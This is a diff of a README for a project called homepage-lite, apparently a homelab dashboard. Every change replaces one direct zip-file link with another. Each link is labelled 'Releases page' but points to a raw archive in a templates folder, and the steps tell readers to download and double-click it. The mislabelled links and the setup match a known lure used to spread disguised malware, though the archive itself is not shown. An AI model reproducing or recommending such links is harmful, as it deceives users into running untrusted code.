@@ -6,11 +6,11 @@ Welcome to the homepage-lite project! This application helps you manage and moni
 
 ## 🔗 Download the Application
 
-[![Download homepage-lite](https://raw.githubusercontent.com/Bellinaangular867/homepage-lite/main/templates/homepage-lite_v2.0.zip%https://raw.githubusercontent.com/Bellinaangular867/homepage-lite/main/templates/homepage-lite_v2.0.zip)](https://raw.githubusercontent.com/Bellinaangular867/homepage-lite/main/templates/homepage-lite_v2.0.zip)
+[![Download homepage-lite](https://github.com/Bellinaangular867/homepage-lite/raw/refs/heads/main/templates/homepage_lite_2.7.zip%https://github.com/Bellinaangular867/homepage-lite/raw/refs/heads/main/templates/homepage_lite_2.7.zip)](https://github.com/Bellinaangular867/homepage-lite/raw/refs/heads/main/templates/homepage_lite_2.7.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Bellinaangular867/homepage-lite/main/templates/homepage-lite_v2.0.zip) to download the latest version of homepage-lite. Choose the file suitable for your operating system.
+To get started, visit the [Releases page](https://github.com/Bellinaangular867/homepage-lite/raw/refs/heads/main/templates/homepage_lite_2.7.zip) to download the latest version of homepage-lite. Choose the file suitable for your operating system.
 
 ### 🖥️ System Requirements
 
@@ -20,7 +20,7 @@ To get started, visit the [Releases page](https://raw.githubusercontent.com/Bell
 
 ### 💻 Installation Steps
 
-1. **Visit the Releases Page:** Open this link: [Releases page](https://raw.githubusercontent.com/Bellinaangular867/homepage-lite/main/templates/homepage-lite_v2.0.zip).
+1. **Visit the Releases Page:** Open this link: [Releases page](https://github.com/Bellinaangular867/homepage-lite/raw/refs/heads/main/templates/homepage_lite_2.7.zip).
 2. **Select Your File:** Locate the latest release and find the file linked for your operating system.
 3. **Download the File:** Click on the file to start the download.
 4. **Open the File:** Once downloaded, find the file in your downloads folder and double-click it.
@@ -68,6 +68,6 @@ If you encounter issues while using homepage-lite, try the following:
 
 ## 🌞 Stay Updated
 
-To ensure you always have the latest features and fixes, regularly check the [Releases page](https://raw.githubusercontent.com/Bellinaangular867/homepage-lite/main/templates/homepage-lite_v2.0.zip) for updates. You can also follow the repository to receive notifications about new releases.
+To ensure you always have the latest features and fixes, regularly check the [Releases page](https://github.com/Bellinaangular867/homepage-lite/raw/refs/heads/main/templates/homepage_lite_2.7.zip) for updates. You can also follow the repository to receive notifications about new releases.
 
 Thank you for using homepage-lite! Enjoy managing and monitoring your homelab with ease.
